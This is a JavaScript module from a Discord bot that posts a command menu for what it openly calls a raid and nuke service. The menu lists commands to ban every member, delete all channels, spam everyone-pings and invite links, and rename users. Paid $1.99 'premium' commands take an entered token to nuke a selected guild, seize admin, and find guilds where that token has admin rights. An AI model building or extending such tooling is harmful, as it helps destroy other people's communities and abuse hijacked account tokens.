module.exports = {
    name: "showpremium",
    description: "Displays a list of available commands",
    execute: async (message, args, client) => {
        const embed = {
            "title": "‎ ‎ ‎ ‎ ‎‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ <:dolce_167:1246892013240975360>‎ ‎ ‎ application‎ commands ‎ ‎ <:dolce_167:1246892013240975360>‎‎ ‎ ‎ ‎ ‎‎‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎  ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎",
            "description": "<:025:1248810653821567006> **normal cmds ;**\n<:dolce_145:1246893443800891503> `&on` **start a raid in the server who the command was executed**\n<:dolce_145:1246893443800891503> `&banall` **ban all users in the server**\n<:dolce_145:1246893443800891503> `&channels` **delete all channels in the server**\n<:dolce_145:1246893443800891503> `&spamchannels` **spam all channels with everyone and invite link**\n<:dolce_145:1246893443800891503> `&spamroles` **spam server roles**\n<:dolce_145:1246893443800891503> `&spamusers` **rename all users with our vanity**\n<:dolce_145:1246893443800891503> `&top` **view the top of raids with our bot**\n\n<:dolce_167:1246892013240975360> **premium cmds $**\n<:dolce_145:1246893443800891503> `#invite.guild` **provide a invite to the guild**\n<:dolce_145:1246893443800891503> `#use.token` **enter a token to use it for raiding or nuking**\n<:dolce_145:1246893443800891503> `#use.guild` **select the guild to nuke**\n<:dolce_145:1246893443800891503> `#nuke.guild` **nuke the selected guild**\n<:dolce_145:1246893443800891503> `#admin.guild` **get admin on the selected guild**\n<:dolce_145:1246893443800891503> `#find.guilds` **find admin guilds with the selected token**\n\n>  <:dolce_145:1246893443800891503> *¿what is premium? \n> It works to customize the bot with your settings.*\n>  <:dolce_145:1246893443800891503> *¿how to get premium?*\n> *get premium buying it for $1.99 ¡lifetime! [[here]](https://discord.gg/5RSRu9HTGE)*",
            "color": 15794690
        }

        try {
            await message.channel.send({ embeds: [embed] });
        } catch (error) {
            console.error("Could not send the help embed.", error);
            message.reply("I couldn't send the help embed. Please try again later.");
        }
    }
};